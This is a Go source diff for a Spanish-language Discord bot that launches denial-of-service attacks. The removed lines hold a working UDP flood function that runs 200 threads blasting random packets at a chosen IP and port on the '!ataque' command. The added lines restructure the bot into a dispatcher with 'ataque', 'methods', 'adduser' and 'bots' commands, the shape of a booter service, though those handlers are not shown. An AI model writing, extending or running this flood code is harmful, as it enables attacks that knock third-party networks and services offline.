@@ -1,138 +1,89 @@
 package main
 
 import (
-	"bufio"
 	"fmt"
-	"math/rand"
-	"net"
+	"log"
 	"os"
-	"strconv"
+	"os/signal"
 	"strings"
-	"sync"
-	"time"
+	"syscall"
 
 	"github.com/bwmarrin/discordgo"
 )
 
-func saveToken(token string) error {
-	f, err := os.Create("token.txt")
-	if err != nil {
-		return err
-	}
-	defer f.Close()
-	_, err = f.WriteString(token)
-	return err
-}
-
-func readToken() (string, error) {
-	// Intentamos leer el token del entorno, si no existe leemos del archivo
-	token := os.Getenv("DISCORD_TOKEN")
-	if token != "" {
-		return token, nil
-	}
-	data, err := os.ReadFile("token.txt")
-	if err != nil {
-		return "", err
-	}
-	return strings.TrimSpace(string(data)), nil
-}
-
-func flood(target string, port int, duration int, wg *sync.WaitGroup) {
-	defer wg.Done()
-
-	raddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", target, port))
-	if err != nil {
-		return
-	}
-
-	conn, err := net.DialUDP("udp", nil, raddr)
-	if err != nil {
-		return
-	}
-	defer conn.Close()
-
-	endTime := time.Now().Add(time.Duration(duration) * time.Second)
-
-	packetSize := 1400
-	payload := make([]byte, packetSize)
-	rand.Read(payload)
-
-	for time.Now().Before(endTime) {
-		_, err := conn.Write(payload)
-		if err != nil {
-			continue
-		}
-	}
-}
-
-func runFlood(target string, port, duration int) {
-	rand.Seed(time.Now().UnixNano())
-	threads := 200
-	var wg sync.WaitGroup
-	wg.Add(threads)
-
-	for i := 0; i < threads; i++ {
-		go flood(target, port, duration, &wg)
-	}
-
-	wg.Wait()
-}
+var (
+	Token   string
+	OwnerID string // Reemplaza con tu ID de usuario de Discord
+)
 
 func main() {
-	var token string
-	var err error
-
-	token, err = readToken()
-	if err != nil {
-		fmt.Println("Error al leer el token:", err)
-		fmt.Print("Introduce el token de tu bot de Discord: ")
-		reader := bufio.NewReader(os.Stdin)
-		token, _ = reader.ReadString('\n')
-		token = strings.TrimSpace(token)
-		saveToken(token)
+	Token = os.Getenv("DISCORD_TOKEN")
+	if Token == "" {
+		log.Fatal("Error: DISCORD_TOKEN no está definido en las variables de entorno.")
+		return
+	}
+	OwnerID = os.Getenv("OWNER_ID")
+	if OwnerID == "" {
+		log.Println("Advertencia: OWNER_ID no está definido, algunas funciones estarán restringidas.")
 	}
 
-	dg, err := discordgo.New("Bot " + token)
+	dg, err := discordgo.New("Bot " + Token)
 	if err != nil {
-		fmt.Println("Error al crear sesión de Discord:", err)
+		fmt.Println("Error al crear la sesión de Discord:", err)
 		return
 	}
 
-	dg.AddHandler(func(s *discordgo.Session, m *discordgo.MessageCreate) {
-		if m.Author.Bot {
-			return
-		}
-		content := m.Content
-		if strings.HasPrefix(content, "!ataque") {
-			args := strings.Fields(content)
-			if len(args) == 1 {
-				s.ChannelMessageSend(m.ChannelID, "`!ataque udp [IP] [PUERTO] [TIEMPO]`")
-				return
-			}
-			if len(args) == 5 && args[1] == "udp" {
-				ip := args[2]
-				port, err1 := strconv.Atoi(args[3])
-				duration, err2 := strconv.Atoi(args[4])
-				if err1 != nil || err2 != nil {
-					s.ChannelMessageSend(m.ChannelID, "Puerto o tiempo no válido")
-					return
-				}
-				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Successful Attack IP:%s:%d Time: %d ", ip, port, duration))
-				go func() {
-					runFlood(ip, port, duration)
-					s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Atack finish %s:%d finalizado.", ip, port))
-				}()
-				return
-			}
-			s.ChannelMessageSend(m.ChannelID, "`!ataque udp [IP] [PUERTO] [TIEMPO]`")
-		}
-	})
+	dg.AddHandler(messageCreate)
+
+	dg.Identify = discordgo.Identify{
+		Token: Token,
+		Intents: discordgo.IntentsGuilds |
+			discordgo.IntentsGuildMessages |
+			discordgo.IntentsDirectMessages,
+	}
 
 	err = dg.Open()
 	if err != nil {
 		fmt.Println("Error al abrir la conexión:", err)
 		return
 	}
-	fmt.Println("Bot ON¡!")
-	select {}
+
+	fmt.Println("Bot is now running.  Press CTRL-C to exit.")
+	sc := make(chan os.Signal, 1)
+	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
+	<-sc
+
+	dg.Close()
 }
+
+func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
+	if m.Author.ID == s.State.User.ID {
+		return
+	}
+
+	prefix := "!"
+
+	if strings.HasPrefix(m.Content, prefix) {
+		command := strings.TrimPrefix(m.Content, prefix)
+		command = strings.SplitN(command, " ", 2)[0] // Obtener solo el primer comando
+		args := strings.SplitN(m.Content, " ", 3)
+
+		switch command {
+		case "ayuda":
+			ayudaCommand(s, m)
+		case "methods":
+			methodsCommand(s, m)
+		case "adduser":
+			addUserCommand(s, m, args)
+		case "deleteuser":
+			deleteUserCommand(s, m, args)
+		case "ataque":
+			ataqueCommand(s, m, args)
+		case "bots":
+			botsCommand(s, m)
+		default:
+			s.ChannelMessageSend(m.ChannelID, "Comando desconocido. Usa !ayuda para ver la lista de comandos.")
+		}
+	}
+}
+
